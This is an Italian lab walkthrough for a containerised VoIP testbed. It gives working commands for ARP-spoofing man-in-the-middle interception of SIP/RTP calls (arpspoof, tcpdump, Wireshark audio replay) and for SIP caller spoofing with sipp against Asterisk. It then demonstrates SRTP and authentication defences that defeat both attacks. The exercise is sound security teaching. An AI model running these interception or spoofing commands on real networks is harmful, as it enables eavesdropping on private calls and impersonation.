# Attacco 1 

prima di tutto avviamo i container con docker compose up 

poi entriamo nel terminale dell' attaccante docker exec -it voip-attacker bash

verifichiamo ip_forward cat /proc/sys/net/ipv4/ip_forward

Poi avviamo ARp spoofing:
# 1) dì alla VITTIMA che "Asterisk sei tu"
arpspoof -i eth0 -t 172.20.0.20 172.20.0.10 > /dev/null 2>&1 &

# 2) dì ad ASTERISK che "la vittima sei tu"
arpspoof -i eth0 -t 172.20.0.10 172.20.0.20 > /dev/null 2>&1 &

# 3) cattura tutto il traffico UDP (SIP + RTP) su file
tcpdump -i eth0 -w /captures/voip.pcap udp

In un secondo terminale avvio la telefonata

docker attach voip-phone

digito 500 e dopo 15 sec premo b, poi ctrl p e ctrl q

ritorno nell altro terminale, premo ctrl c e poi pkill arpspoof e exit

con wireshark captures/voip.pcap 
ascolto l audio (telephony -> rtp -> rtp streams)

#ATTACCO 2

## 1) Accediamo al logger SIP di Asterisk
docker exec voip-asterisk asterisk -rx "pjsip set logger on"

## 2) Chiamata falsificata dallo spoofer
docker exec -it voip-spoofer sipp -sf /root/spoof.xml 172.20.0.10:5060 -m 1 -nostdin

## 3) Mostrare l'attaco
sia controllando log asterisk, sia utilizzando wireshark.

# DIFESA ATTACCO 1 (intercettazione) — SRTP

## 0) Pulizia + avvio in modalità sicura
docker compose --profile insecure --profile secure down --remove-orphans
docker compose --profile secure up --build

## 1) Chiamata legittima (ora cifrata)
# Deve funzionare come sempre: il telefono 6001 negozia SRTP con Asterisk.
docker attach voip-phone      # digito 500 + Invio; 'b' per chiudere, Ctrl-P Ctrl-Q per staccarmi

## 2) Rifaccio l'intercettazione (stessa procedura dell'attacco 1)
docker exec -it voip-attacker bash
# dentro il container:
arpspoof -i eth0 -t 172.20.0.20 172.20.0.10 > /dev/null 2>&1 &
arpspoof -i eth0 -t 172.20.0.10 172.20.0.20 > /dev/null 2>&1 &
tcpdump -i eth0 -w /captures/voip_srtp.pcap udp
# (in un altro terminale faccio la chiamata al 500, poi Ctrl-C qui, pkill arpspoof, exit)

## 3) Verifica della cifratura (cattura live sull'interfaccia del bridge)
# Apro Wireshark direttamente sull'interfaccia br-<id> (Cattura live), filtro: sip
# Nell'INVITE -> SDP cerco:
#   m=audio ... RTP/SAVP      -> SRTP attivo (S = Secure)
#   a=crypto:1 AES_CM_...     -> chiave di cifratura

## 4) Risultato atteso
# - Telephony -> RTP -> "flussi 0": Wireshark non ricostruisce l'audio.
#   (Decodifica come RTP -> riproduzione = solo RUMORE, non i toni)
# - L'audio e' protetto: l'intercettazione FALLISCE nel suo scopo.

## Nota importante (perche' serve anche TLS)
# La riga a=crypto contiene la CHIAVE SRTP e viaggia nel SIP IN CHIARO:
# chi legge la segnalazione puo' estrarla. Per questo la difesa si completa
# solo cifrando anche il SIP con TLS (tappa 2).



# DIFESA ATTACCO 2 (spoofing) — Autenticazione

## 0) Pulizia (necessaria quando si cambia profilo)
# Rimuove i container di ENTRAMBI i profili, incluso il vecchio "voip-asterisk"
# rimasto attivo: senza questo, il nuovo centralino va in conflitto sul nome.
docker compose --profile insecure --profile secure down --remove-orphans

## 1) Avvio del centralino SICURO
# le chiamate non autenticate vengono rifiutate.
docker compose --profile secure up --build

## 2) Verifica che la falla sia chiusa
# Devono comparire solo 6001 e 6002 — NIENTE "anonymous".
docker exec voip-asterisk asterisk -rx "pjsip show endpoints"

## 3) Riprovo lo STESSO spoof dell'attacco 2
docker exec -it voip-spoofer sipp -sf /root/spoof.xml 172.20.0.10:5060 -m 1 -nostdin

## 4) Risultato atteso: l'attacco FALLISCE
# - sipp riporta "Failed call: 1" (prima era "Successful call: 1")
# - Asterisk risponde "401 Unauthorized" con header "WWW-Authenticate"
#   -> chiede le credenziali; lo spoofer non le ha, quindi non passa.

## (Opzionale) Prova che gli utenti VERI funzionano ancora
# Dimostra che la difesa blocca gli attaccanti senza rompere il servizio.
docker attach voip-phone     # digito 500 + Invio; deve funzionare. 'b', poi Ctrl-P Ctrl-Q



